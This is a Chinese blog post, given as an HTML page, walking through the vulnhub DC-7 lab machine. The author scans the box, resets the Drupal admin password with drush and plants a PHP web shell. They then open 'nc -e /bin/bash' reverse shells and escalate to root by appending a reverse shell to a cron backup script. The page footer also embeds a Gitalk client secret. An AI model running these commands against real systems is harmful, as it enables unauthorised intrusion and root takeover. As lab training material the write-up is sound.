@@ -1,0 +1,278 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>vulnhub DC-7 靶机 | white0123</title>
+<link rel="shortcut icon" href="https://wghahaha.github.io/favicon.ico?v=1714286336284">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://wghahaha.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="vulnhub DC-7 靶机 | white0123 - Atom Feed" href="https://wghahaha.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="DC -7 靶机
+前言：
+几天没玩了。这个系列还有三个靶机 这几天抓紧时间打完吧
+攻击机 :         kali                                192.168.56.132
+靶机    ：      D..." />
+    <meta name="keywords" content="vulnhub" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://wghahaha.github.io">
+  <img class="avatar" src="https://wghahaha.github.io/images/avatar.png?v=1714286336284" alt="">
+  </a>
+  <h1 class="site-title">
+    white0123
+  </h1>
+  <p class="site-description">
+    永远保持第一天接触网络安全的热情
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              vulnhub DC-7 靶机
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-03-15
+              </span>
+              <span>
+                2 min read
+              </span>
+              
+                <a href="https://wghahaha.github.io/tag/gd7wNOhQ5/" class="post-tag">
+                  # vulnhub
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h4 id="dc-7-靶机">DC -7 靶机</h4>
+<p>前言：</p>
+<p>几天没玩了。这个系列还有三个靶机 这几天抓紧时间打完吧</p>
+<p>攻击机 :         kali                                192.168.56.132</p>
+<p>靶机    ：      DC-7                               192.168.56.148</p>
+<p>网络连接方式 ： 均为 NAT模式</p>
+<h5 id="内网信息探测">内网信息探测</h5>
+<p>还是使用 arp-scan 和 nmap 确定靶机的 IP 和开放的端口</p>
+<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230315112108884.png" alt="image-20230315112108884" loading="lazy"></figure>
+<pre><code class="language-shell">// 通过 mac地址确定靶机IP为192.168.56.148   靶机开放的端口有 22（ssh）    80（web页面）
+</code></pre>
+<p>通过浏览器访问靶机IP</p>
+<figure data-type="image" tabindex="2"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230315112334664.png" alt="image-20230315112334664" loading="lazy"></figure>
+<p>发现搭建的CMS是前面见过的 Drupal 我们首先想到的是去kali找nday打 但是页面好像提示。丢到谷歌翻译下。</p>
+<figure data-type="image" tabindex="3"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230315112538617.png" alt="image-20230315112538617" loading="lazy"></figure>
+<p>需要我们跳出框框思考？</p>
+<h5 id="ssh连接">SSH连接</h5>
+<pre><code class="language-SHELL">//思考了很多 这里直接说方法吧
+谷歌直接搜 DC7 USER
+</code></pre>
+<figure data-type="image" tabindex="4"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230315120304144.png" alt="image-20230315120304144" loading="lazy"></figure>
+<p>得到账号密码</p>
+<figure data-type="image" tabindex="5"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230315120332732.png" alt="image-20230315120332732" loading="lazy"></figure>
+<p>然后SSH连接</p>
+<figure data-type="image" tabindex="6"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230315120420185.png" alt="image-20230315120420185" loading="lazy"></figure>
+<pre><code class="language-shell">drush user-password admin --password=&quot;123456&quot; //修改密码
+//提示错误 切换到指定路径再执行上面的命令就可以了。
+</code></pre>
+<p>登录到网站后   发现可以写入一句话马，但是没有php模块。安装一个php模块就可以了。</p>
+<p>然后写入一句马，使用蚁剑连接。</p>
+<h5 id="反弹shell">反弹shell</h5>
+<figure data-type="image" tabindex="7"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230315121137084.png" alt="image-20230315121137084" loading="lazy"></figure>
+<p>连接后监听kali端口</p>
+<pre><code class="language-shell">nc -lvvp 6666
+</code></pre>
+<p>在蚁剑执行虚拟终端</p>
+<pre><code class="language-shell">nc -e /bin/bash 192.168.56.132 6666
+</code></pre>
+<p>然后使用python的pty模块得到完整的shell环境</p>
+<pre><code class="language-shell">python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'
+</code></pre>
+<h5 id="权限提升">权限提升</h5>
+<p>到 /opt/scripts 执行</p>
+<pre><code class="language-shell">echo &quot;nc -e /bin/bash 192.168.56.132 4444&quot; &gt;&gt;backups.sh
+</code></pre>
+<pre><code class="language-shell">//kali监听端口 vc -lvvp 4444
+</code></pre>
+<p>等待反弹shell 时间相对来说长一点</p>
+<p>然后执行python的pty模块 得到完整的shell</p>
+<p>到根目录下得到flag</p>
+<figure data-type="image" tabindex="8"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230315121754195.png" alt="image-20230315121754195" loading="lazy"></figure>
+<h5 id="总结">总结</h5>
+<p>实际操作难度不大 但是对于信息的收集与观察比较重要。还有就是提权方式。</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li>
+<ul>
+<li>
+<ul>
+<li><a href="#dc-7-%E9%9D%B6%E6%9C%BA">DC -7 靶机</a>
+<ul>
+<li><a href="#%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%8E%A2%E6%B5%8B">内网信息探测</a></li>
+<li><a href="#ssh%E8%BF%9E%E6%8E%A5">SSH连接</a></li>
+<li><a href="#%E5%8F%8D%E5%BC%B9shell">反弹shell</a></li>
+<li><a href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87">权限提升</a></li>
+<li><a href="#%E6%80%BB%E7%BB%93">总结</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://wghahaha.github.io/post/vulnhub-dc-5-ba-ji/">
+              <h3 class="post-title">
+                vulnhub DC-5 靶机
+              </h3>
+            </a>
+          </div>
+        
+
+        
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: '60a6742bb0cdc1129286',
+    clientSecret: '2c932a185a0c37b7924302f1ab242ffd3c186641',
+    repo: 'wghahaha.github.io',
+    owner: 'wghahaha',
+    admin: ['wghahaha'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+          
+
+          
+        
+
+        <div class="site-footer">
+  <div>
+	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+	<span id="busuanzi_container_site_uv" style='display:none'>总访客人数量<span id="busuanzi_value_site_uv"></span>次</span>
+	<span id="busuanzi_container_site_pv" style='display:none'>本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+</div>
+  <a class="rss" href="https://wghahaha.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
